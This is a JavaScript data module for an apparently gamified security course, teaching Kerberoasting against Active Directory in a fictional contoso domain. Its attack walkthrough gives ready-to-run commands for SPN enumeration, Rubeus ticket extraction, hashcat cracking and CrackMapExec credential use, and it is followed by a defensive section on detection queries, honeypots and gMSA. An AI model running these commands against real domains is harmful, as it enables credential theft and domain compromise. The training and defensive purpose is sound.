export const theoryModules = {
  'kerberoasting': {
    id: 'kerberoasting',
    title: 'Kerberoasting Attack Fundamentals',
    subtitle: 'Master the art of extracting service account credentials',
    estimatedTime: '15 minutes',
    difficulty: 'Intermediate',
    xpReward: 150,
    prerequisites: ['ad-basics', 'kerberos-101'],
    
    // Learning objectives
    objectives: [
      'Understand how Kerberos service authentication works',
      'Identify service accounts vulnerable to Kerberoasting',
      'Execute the attack using modern tools',
      'Recognize detection methods and defensive measures'
    ],
    
    // Multiple learning modes
    learningModes: {
      guided: {
        name: 'Guided Tutorial',
        icon: '🎓',
        description: 'Step-by-step walkthrough with explanations',
        recommended: true
      },
      interactive: {
        name: 'Interactive Lab',
        icon: '🔬',
        description: 'Hands-on practice with real commands',
        unlockCondition: 'complete_guided'
      },
      video: {
        name: 'Video Lesson',
        icon: '🎬',
        description: '10-minute video explanation',
        videoUrl: 'https://youtube.com/...' // Optional
      },
      flashcards: {
        name: 'Quick Review',
        icon: '🗂️',
        description: 'Flashcards for quick concept review'
      }
    },
    
    // Visual learning aids
    visuals: {
      heroImage: '/assets/kerberoasting-hero.svg',
      conceptMap: '/assets/kerberoasting-concept-map.svg',
      flowDiagram: {
        nodes: [
          { id: 'user', label: 'Authenticated User', type: 'actor', x: 50, y: 100 },
          { id: 'dc', label: 'Domain Controller', type: 'server', x: 300, y: 100 },
          { id: 'service', label: 'Service Account', type: 'target', x: 550, y: 100 }
        ],
        connections: [
          { from: 'user', to: 'dc', label: 'Request TGS', color: 'blue', animated: true },
          { from: 'dc', to: 'user', label: 'Encrypted TGS', color: 'red', animated: true },
          { from: 'user', to: 'service', label: 'Access with TGS', color: 'green', animated: false }
        ]
      }
    },
    
    sections: [
      {
        id: 'intro',
        title: '🎯 What is Kerberoasting?',
        type: 'intro',
        duration: '2 min',
        content: `Kerberoasting is a post-exploitation attack that targets service accounts in Active Directory. It's one of the most common and effective ways to escalate privileges in an AD environment.

**Why it matters:** Service accounts often have elevated privileges and weak passwords, making them prime targets for attackers.

**Real-world impact:** Used in 60%+ of AD compromises, including major ransomware attacks.`,
        
        callout: {
          type: 'important',
          title: 'Critical Insight',
          content: 'Any authenticated domain user can request service tickets - no special privileges required!'
        },
        
        interactiveElement: {
          type: 'thought-question',
          question: 'Before we continue: What do you think makes service accounts attractive targets?',
          hints: ['Think about passwords', 'Consider permissions', 'Who manages them?']
        }
      },
      
      {
        id: 'kerberos-fundamentals',
        title: '🔐 Kerberos Authentication Crash Course',
        type: 'concept',
        duration: '3 min',
        
        // Tabbed content for different learning styles
        contentTabs: [
          {
            name: 'Simple Explanation',
            icon: '👶',
            content: `Think of Kerberos like a school system:
            
1. **Student Badge (TGT)**: You show your ID to the office and get a student badge
2. **Class Pass (TGS)**: You show your badge to get permission slips for specific classes
3. **Enter Class (Service Access)**: You show your permission slip to enter the classroom

The "permission slip" is encrypted with the teacher's (service account's) password!`
          },
          {
            name: 'Technical Details',
            icon: '🔬',
            content: `Kerberos is a network authentication protocol using symmetric key cryptography:

**Components:**
- **KDC (Key Distribution Center)**: Authentication server on DC
- **TGT (Ticket Granting Ticket)**: Proves user authentication
- **TGS (Ticket Granting Service)**: Issues service tickets
- **Service Ticket**: Encrypted with service account NTLM hash

**The Vulnerability:**
Service tickets are encrypted with the service account's password hash, which means if we can capture the ticket, we can crack it offline.`
          },
          {
            name: 'Visual Diagram',
            icon: '📊',
            content: 'interactive-diagram', // Triggers diagram rendering
            diagram: 'kerberos-flow'
          }
        ],
        
        keyTerms: {
          'TGT': 'Ticket Granting Ticket - Proves you\'re an authenticated user',
          'TGS': 'Ticket Granting Service - Issues tickets for specific services',
          'SPN': 'Service Principal Name - Unique identifier for services',
          'RC4': 'Legacy encryption algorithm (weaker, faster to crack)'
        }
      },
      
      {
        id: 'spn-deep-dive',
        title: '🎯 Service Principal Names (SPNs)',
        type: 'concept',
        duration: '3 min',
        
        content: `SPNs are the linchpin of Kerberoasting. They're unique identifiers that map services to service accounts.`,
        
        // Interactive command explorer
        interactiveCommands: [
          {
            command: 'setspn -L svc_sql',
            description: 'List SPNs for a service account',
            output: `Registered ServicePrincipalNames for CN=svc_sql,OU=ServiceAccounts,DC=contoso,DC=local:
    MSSQLSvc/SQL01.contoso.local:1433
    MSSQLSvc/SQL01.contoso.local`,
            explanation: 'This shows two SPNs registered to the svc_sql account - one with port, one without',
            tryItButton: true
          },
          {
            command: 'Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName',
            description: 'Find all accounts with SPNs (PowerShell)',
            output: `DistinguishedName : CN=svc_sql,OU=ServiceAccounts,DC=contoso,DC=local
ServicePrincipalName : {MSSQLSvc/SQL01.contoso.local:1433}

DistinguishedName : CN=svc_web,OU=ServiceAccounts,DC=contoso,DC=local  
ServicePrincipalName : {HTTP/web.contoso.local}`,
            explanation: 'PowerShell provides more detailed output including account DN'
          }
        ],
        
        // Quiz question embedded in content
        checkYourUnderstanding: {
          question: 'What information does an SPN provide?',
          options: [
            'The service account password',
            'The service type, host, and port',
            'The domain administrator credentials',
            'The user\'s TGT'
          ],
          correct: 1,
          explanation: 'SPNs follow the format ServiceClass/Host:Port, identifying exactly which service is running where.'
        }
      },
      
      {
        id: 'attack-walkthrough',
        title: '⚔️ The Attack Process',
        type: 'interactive-tutorial',
        duration: '5 min',
        
        steps: [
          {
            number: 1,
            title: 'Enumerate SPNs',
            description: 'Find all service accounts in the domain',
            
            // Multiple tool options
            toolOptions: [
              {
                name: 'PowerView',
                recommended: true,
                command: 'Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName',
                pros: ['Native PowerShell', 'Detailed output', 'Built-in filtering'],
                cons: ['Requires PowerView', 'Can be flagged by AV']
              },
              {
                name: 'Impacket',
                command: 'GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.1.10',
                pros: ['Works from Linux', 'Stealthy', 'No AV concerns'],
                cons: ['Requires network access', 'Python dependency']
              },
              {
                name: 'Native Windows',
                command: 'setspn -Q */*',
                pros: ['No tools needed', 'Very stealthy', 'Always available'],
                cons: ['Limited output format', 'Harder to parse']
              }
            ],
            
            expectedOutput: `svc_sql
    MSSQLSvc/SQL01.contoso.local:1433
    
svc_web
    HTTP/web.contoso.local
    
svc_backup
    CIFS/BACKUP01.contoso.local`,
            
            hints: [
              'Look for accounts with ServicePrincipalName attribute set',
              'Service accounts often have "svc_" prefix',
              'Focus on high-value services (SQL, IIS, CIFS)'
            ],
            
            redTeamTip: {
              icon: '🎩',
              content: 'Pro tip: Target accounts with AdminCount=1 first - they often have Domain Admin privileges!'
            }
          },
          
          {
            number: 2,
            title: 'Request Service Tickets',
            description: 'Ask the DC for tickets encrypted with service account hashes',
            
            // Side-by-side comparison
            comparison: {
              method1: {
                name: 'Rubeus (Recommended)',
                command: 'Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt',
                advantages: [
                  'Single command execution',
                  'Automatic hash formatting',
                  'Can target specific users',
                  'Supports filtering by encryption type'
                ],
                output: `[*] Action: Kerberoasting
[*] SPN: MSSQLSvc/SQL01.contoso.local:1433
[*] Hash written to hashes.txt`,
                screenshot: '/assets/rubeus-output.png'
              },
              method2: {
                name: 'Manual PowerShell',
                command: `Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.contoso.local:1433"`,
                advantages: [
                  'No external tools',
                  'Scriptable',
                  'Very stealthy'
                ],
                disadvantages: [
                  'Multi-step process',
                  'Manual extraction needed',
                  'Harder to format output'
                ]
              }
            },
            
            securityNote: {
              type: 'warning',
              content: 'This generates Event ID 4769 on the DC. Requesting many tickets in succession is a red flag!'
            }
          },
          
          {
            number: 3,
            title: 'Crack the Hashes',
            description: 'Use offline cracking to recover passwords',
            
            crackingGuide: {
              hashFormats: [
                {
                  type: 'Hashcat (Type 13100)',
                  example: '$krb5tgs$23$*user$realm$spn*$hash...',
                  detectBy: 'Starts with $krb5tgs$23$'
                },
                {
                  type: 'John the Ripper',
                  example: '$krb5tgs$23$*...',
                  detectBy: 'Same format, different tool'
                }
              ],
              
              commands: [
                {
                  tool: 'Hashcat',
                  command: 'hashcat -m 13100 -a 0 hashes.txt rockyou.txt',
                  explanation: '-m 13100 = Kerberos TGS-REP, -a 0 = dictionary attack',
                  estimatedTime: 'Depends on password complexity and hardware',
                  gpuBenchmark: '~200,000 H/s on RTX 3080'
                },
                {
                  tool: 'John the Ripper',
                  command: 'john --format=krb5tgs --wordlist=rockyou.txt hashes.txt',
                  explanation: 'Alternative to hashcat, slower but more compatible'
                }
              ],
              
              tips: [
                'Start with common passwords (Summer2023!, Password123!)',
                'Service accounts often use predictable patterns',
                'Use company name + season + year as wordlist base',
                'GPU cracking is 100x faster than CPU'
              ]
            },
            
            successOutput: `$krb5tgs$23$*svc_sql$CONTOSO.LOCAL$MSSQLSvc/SQL01*$...:P@ssw0rd123!

Status: Cracked
Time: 2 minutes 37 seconds
Attempts: 45,234,891`,
            
            celebration: {
              message: '🎉 Password cracked! This account likely has database access.',
              nextSteps: [
                'Test credentials with CrackMapExec',
                'Check if account has admin rights',
                'Look for sensitive data access'
              ]
            }
          },
          
          {
            number: 4,
            title: 'Validate & Exploit',
            description: 'Confirm access and use the compromised account',
            
            validationCommands: [
              {
                purpose: 'Test authentication',
                command: 'crackmapexec smb 10.0.1.0/24 -u svc_sql -p "P@ssw0rd123!"',
                successIndicator: 'Pwn3d!'
              },
              {
                purpose: 'Check admin access',
                command: 'crackmapexec smb 10.0.1.10 -u svc_sql -p "P@ssw0rd123!" -x whoami',
                successIndicator: 'contoso\\svc_sql'
              }
            ],
            
            escalationPaths: [
              {
                scenario: 'Database Admin',
                description: 'Service account has sysadmin on SQL Server',
                exploitation: 'Use xp_cmdshell for code execution',
                impact: 'Access to all databases, potential lateral movement'
              },
              {
                scenario: 'Domain Admin',
                description: 'Account is member of Domain Admins',
                exploitation: 'DCSync attack to dump all domain hashes',
                impact: 'Complete domain compromise'
              }
            ]
          }
        ],
        
        // Interactive practice at the end
        practiceChallenge: {
          title: 'Try It Yourself',
          description: 'Complete this mini-challenge before moving on',
          task: 'Identify which command would extract SPNs for accounts in the "Service Accounts" OU',
          options: [
            'Get-ADUser -SearchBase "OU=Service Accounts,DC=contoso,DC=local" -Filter * -Properties ServicePrincipalName',
            'Get-DomainUser -LDAPFilter "(servicePrincipalName=*)"',
            'setspn -Q "OU=Service Accounts"',
            'Rubeus.exe kerberoast /ou:"Service Accounts"'
          ],
          correct: 0,
          explanation: 'Option 1 uses AD PowerShell with -SearchBase to target a specific OU and retrieves the SPN property.'
        }
      },
      
      {
        id: 'defense-blue-team',
        title: '🛡️ Defense & Detection',
        type: 'defensive',
        duration: '3 min',
        
        perspective: 'blue-team',
        
        detectionMethods: [
          {
            level: 'basic',
            name: 'Event Log Monitoring',
            description: 'Monitor for suspicious Kerberos ticket requests',
            
            splunkQuery: `index=windows EventCode=4769 
| where Ticket_Encryption_Type="0x17" 
| stats count by Account_Name 
| where count > 10`,
            
            whatToLookFor: [
              'Multiple 4769 events from single user',
              'RC4 encryption (0x17) instead of AES',
              'Requests for service tickets outside business hours',
              'Tickets for sensitive SPNs (SQL, Exchange)'
            ],
            
            falsePositives: [
              'Legitimate service accounts requesting tickets',
              'Scheduled tasks using service accounts',
              'Monitoring tools querying services'
            ]
          },
          
          {
            level: 'intermediate',
            name: 'Honeypot Accounts',
            description: 'Create fake service accounts to detect attackers',
            
            implementation: `# Create honeypot service account
New-ADUser -Name "svc_backup_admin" -AccountPassword (ConvertTo-SecureString "HoneypotP@ss123!" -AsPlainText -Force) -Enabled $true

# Register fake SPN
setspn -A MSSQL/HONEYPOT.contoso.local:1433 svc_backup_admin

# Set up alert
# Any authentication attempt = confirmed attack`,
            
            advantages: [
              'High-fidelity detection (very few false positives)',
              'Catches both manual and automated attacks',
              'Can track attacker tools and techniques'
            ]
          },
          
          {
            level: 'advanced',
            name: 'Kerberos Armoring',
            description: 'Implement Flexible Authentication Secure Tunneling (FAST)',
            technicalDetails: 'Wraps Kerberos messages in encrypted channel, preventing offline cracking'
          }
        ],
        
        preventionStrategies: [
          {
            priority: 'critical',
            strategy: 'Strong Service Account Passwords',
            implementation: '> 25 characters, random, rotated every 90 days',
            effectiveness: '99%',
            effort: 'Low',
            cost: 'Free',
            howTo: `# Generate secure password
$password = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})

# Set password
Set-ADAccountPassword -Identity svc_sql -NewPassword (ConvertTo-SecureString $password -AsPlainText -Force)`
          },
          
          {
            priority: 'critical',
            strategy: 'Group Managed Service Accounts (gMSA)',
            implementation: 'Use gMSA for all service accounts',
            effectiveness: '100%',
            effort: 'Medium',
            cost: 'Free (requires Server 2012+)',
            benefits: [
              'Automatic 128-character password',
              'Automatic password rotation every 30 days',
              'Impossible to Kerberoast effectively',
              'Centralized management'
            ],
            limitations: [
              'Requires Windows Server 2012 or later',
              'Service must support gMSA',
              'Some third-party apps don\'t support it'
            ]
          },
          
          {
            priority: 'high',
            strategy: 'Disable RC4 Encryption',
            implementation: 'Force AES-256 encryption for Kerberos',
            effectiveness: '80%',
            note: 'Makes cracking significantly slower but doesn\'t prevent the attack',
            gpoPath: 'Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → Network security: Configure encryption types allowed for Kerberos'
          },
          
          {
            priority: 'high',
            strategy: 'Principle of Least Privilege',
            implementation: 'Remove unnecessary permissions from service accounts',
            effectiveness: '60% (reduces impact)',
            checklist: [
              '✓ Remove from Domain Admins group',
              '✓ Grant only required database permissions',
              '✓ Use separate accounts per service',
              '✓ Regularly audit permissions'
            ]
          }
        ],
        
        // Incident response playbook
        incidentResponse: {
          title: 'If You Detect Kerberoasting',
          steps: [
            {
              step: 1,
              action: 'Identify compromised accounts',
              details: 'Review Event ID 4769 logs to find targeted SPNs'
            },
            {
              step: 2,
              action: 'Reset passwords immediately',
              details: 'Change passwords to 30+ character random strings',
              urgency: 'CRITICAL - Do this first!'
            },
            {
              step: 3,
              action: 'Revoke active sessions',
              details: 'klist purge on all systems, revoke Kerberos tickets'
            },
            {
              step: 4,
              action: 'Hunt for lateral movement',
              details: 'Check if compromised account was used to access other systems'
            },
            {
              step: 5,
              action: 'Implement mitigations',
              details: 'Deploy gMSA, strengthen monitoring, update password policy'
            }
          ]
        },
        
        realWorldExample: {
          title: 'Case Study: Healthcare Ransomware',
          scenario: 'Attackers used Kerberoasting to compromise svc_backup account with DA privileges',
          timeline: [
            { time: 'Day 1', event: 'Initial access via phishing' },
            { time: 'Day 2', event: 'Kerberoasting attack, cracked password in 4 hours' },
            { time: 'Day 3', event: 'Lateral movement using compromised service account' },
            { time: 'Day 5', event: 'Ransomware deployed domain-wide' }
          ],
          outcome: '$2.5M ransom, 3 weeks of downtime',
          prevention: 'gMSA would have prevented this entirely'
        }
      }
    ],
    
    // Final assessment
    finalAssessment: {
      type: 'comprehensive-quiz',
      passingScore: 80,
      questions: [
        // ... quiz questions from before ...
      ]
    },
    
    // Completion rewards
    completion: {
      xp: 150,
      badge: 'kerberoasting-expert',
      unlocksScenario: 'kerberoasting',
      certificate: true,
      nextRecommended: ['as-rep-roasting', 'pass-the-ticket']
    }
  }
};